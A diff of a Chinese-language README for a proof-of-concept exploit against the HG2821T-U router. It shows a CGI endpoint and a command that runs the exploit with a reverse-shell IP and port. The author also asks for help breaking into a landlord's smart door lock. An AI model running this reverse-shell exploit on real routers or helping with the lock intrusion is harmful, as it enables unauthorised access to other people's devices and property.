@@ -20,6 +20,7 @@
 http://192.168.x.1/cgi-bin/baseinfoSet.cgi
 ```
 ![image](https://github.com/C4o/HG2821T-U_PoC/blob/master/1.png)
+
 一开始没找着，隔了一阵子就发现有老大哥搞定了编码规则：
 ```
 http://koolshare.cn/forum.php?mod=viewthread&tid=125090&highlight=hg2821
@@ -32,9 +33,12 @@ http://koolshare.cn/forum.php?mod=viewthread&tid=125090&highlight=hg2821
 python HG2821T-U_PoC.py http://192.168.x.1:8080 reverse_ip:reverse:port
 ```
 效果图
+
 ![image](https://github.com/C4o/HG2821T-U_PoC/blob/master/3.png)
 
 ## 学习交流
 最近房东装了智能门锁，但是太菜搞不进去，不知道有没有大师傅肯教教我。
+
 当然，如果有老哥乐意加我扯淡吹牛也同样ojbk。
+
 ![image](https://github.com/C4o/HG2821T-U_PoC/blob/master/2.png)
